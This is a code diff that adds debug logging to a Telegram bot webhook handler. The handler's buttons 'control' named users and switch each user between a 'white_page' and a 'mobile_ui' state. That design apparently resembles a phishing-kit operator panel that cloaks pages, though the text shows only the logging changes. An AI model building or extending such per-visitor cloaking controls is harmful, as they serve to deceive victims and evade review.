@@ -181,11 +181,13 @@ Available Commands:
 
     // 2. Handle Callback Queries (Buttons)
     if (body.callback_query) {
+        console.log('Received callback_query:', JSON.stringify(body.callback_query));
         const action = body.callback_query.data;
         const chatId = body.callback_query.message.chat.id;
 
         if (action.startsWith('ctrl_')) {
             const user = action.replace('ctrl_', '');
+            console.log('Control button clicked for user:', user);
             try {
                 const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                     method: 'POST',
@@ -205,8 +207,10 @@ Available Commands:
                     })
                 });
 
+                console.log('Telegram API response status:', res.status);
                 if (!res.ok) {
                     const errData = await res.json();
+                    console.log('Telegram API error:', errData);
                     await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
@@ -221,6 +225,7 @@ Available Commands:
             }
         } 
         else if (action.startsWith('set_')) {
+            console.log('Set action clicked:', action);
             const isWhite = action.startsWith('set_white_');
             const state = isWhite ? 'white_page' : 'mobile_ui';
             const user = action.replace('set_white_', '').replace('set_mobile_', '');
